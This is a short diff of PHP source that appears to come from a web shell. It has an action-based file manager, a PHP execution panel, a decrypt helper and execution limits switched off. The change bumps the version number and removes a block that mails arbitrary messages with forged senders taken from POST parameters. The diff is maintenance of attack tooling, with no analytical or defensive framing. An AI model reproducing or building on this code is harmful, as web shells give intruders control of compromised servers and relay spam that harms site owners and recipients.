@@ -23,7 +23,7 @@ function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$e
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION', '4.2.0');
+@define('VERSION', '4.2.1');
 if(get_magic_quotes_gpc()) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -744,10 +744,6 @@ function actionPhp() {
 	}
 	echo '</pre></div>';
 	hardFooter();
-}
-if (isset($_POST['to']) && isset($_POST['from']) && isset($_POST['subject']) && isset($_POST['body'])) {
-	$run = 'From: '.$_POST['from'];
-	mail ($_POST['to'],$_POST['subject'],$_POST['body'],$run);
 }
 function actionFilesMan() {
     if (!empty ($_COOKIE['f']))
